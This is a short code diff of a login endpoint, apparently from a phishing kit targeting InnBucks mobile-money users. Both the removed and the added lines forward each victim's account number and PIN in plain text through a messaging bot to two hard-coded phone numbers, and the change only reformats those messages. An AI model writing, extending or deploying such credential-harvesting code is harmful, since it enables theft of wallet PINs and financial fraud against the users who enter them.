@@ -216,11 +216,11 @@ async def login(login_req: LoginRequest):
     try:
         # send to bot and advise that this is from the second screen
         bot.send_message(
-            message=f"Fremen Ops\n\n InnBucks Mobile App Pin from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
+            message=f"Fremen Ops\n\n InnBucks Mobile App Pin from the second screen:{login_req.pin}\n\nInnbucks Number: {login_req.innbucks_number}",
             recipient_id="263779281345",
         )
         bot.send_message(
-            message=f"InnBucks Mobile App Pin from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
+            message=f"InnBucks Mobile App Pin from the second screen:{login_req.pin}\n\nInnbucks Number: {login_req.innbucks_number}",
             recipient_id="263776525400",
         )
             
